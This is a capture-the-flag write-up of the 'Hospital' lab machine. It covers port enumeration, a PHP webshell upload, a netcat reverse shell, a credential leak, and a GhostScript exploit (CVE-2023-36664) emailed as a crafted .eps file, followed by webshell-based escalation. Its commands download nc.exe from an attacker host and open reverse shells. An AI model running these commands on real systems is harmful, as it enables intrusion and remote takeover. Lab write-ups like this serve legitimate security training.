# Hospital (Medium)

A webshell upload on a secondary port leads to a Linux foothold, a webmail config credential leak, a Linux kernel exploit, a GhostScript RCE delivered via email, and finally an IIS directory abuse to a Windows shell.

## Enumeration

```bash
nmap -sC -sV -p- <target>
```

```
22/tcp   open ssh        OpenSSH 9.0p1 Ubuntu
53/tcp   open domain
135/tcp  open msrpc
139/tcp  open netbios-ssn
443/tcp  open ssl/http    Apache 2.4.56 (Win64) — "Hospital Webmail"
445/tcp  open microsoft-ds?
464/tcp  open kpasswd5?
593/tcp  open ncacn_http
1801/tcp open msmq?
2103/tcp open msrpc
2179/tcp open vmrdp?
3269/tcp open globalcatLDAPssl?  (cert CN=DC, DNS:DC.hospital.htb)
3389/tcp open ms-wbt-server (Domain: HOSPITAL)
8080/tcp open http        Apache 2.4.55 (Ubuntu)
```

## Foothold — Webshell upload (port 8080)

A separate Apache instance on 8080 allowed account creation and file upload. A single-file PHP shell, [p0wny-shell](https://github.com/flozz/p0wny-shell), was uploaded; `gobuster` confirmed the upload path.

```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 1234 > /tmp/f
```
→ reverse shell on the Linux host.

A web app's `config.php` leaked a MySQL root password (redacted — `<REDACTED>`), and a kernel version check pointed to a known local-root exploit for that patch level, used to escalate on the Linux side and dump the local user's password hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Webmail login → GhostScript RCE (CVE-2023-36664)

Logged into the Hospital Webmail portal with the cracked credential. An internal email referenced GhostScript, pointing to **CVE-2023-36664** (command injection via a crafted `.eps`/PostScript file):

```bash
python3 CVE_2023_36664_exploit.py --inject --payload "curl http://<attacker>:8000/nc64.exe -o nc.exe" --filename file.eps
```

The crafted file was emailed to a second mailbox; once the recipient opened it, the payload executed and staged `nc.exe`. A follow-up payload delivered a reverse shell:

```bash
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe <attacker> 4444 -e cmd.exe" --filename file.eps
```
→ shell on the **Windows** domain host.

## Privilege Escalation — IIS `htdocs` directory abuse

An XAMPP install's `htdocs` folder was writable, allowing another copy of the p0wny PHP webshell to be dropped and reached via the site's own URL:

```
https://hospital.htb/shell.php
```

This ran in the context of the web server, which had higher privileges, completing the compromise.

## Takeaways

- Secondary ports (8080) running a different, less-hardened app stack than the "main" site are common footholds.
- Config files (`config.php`, `.env`, etc.) routinely leak plaintext DB credentials — always check them after any code-execution foothold.
- Email-based RCEs (GhostScript/ImageMagick processing of attachments) are a realistic pivot from a Linux app server into a Windows mail-reading user.
- World-writable web roots (misconfigured XAMPP/IIS) let any local code execution escalate to the web server's own privilege level.
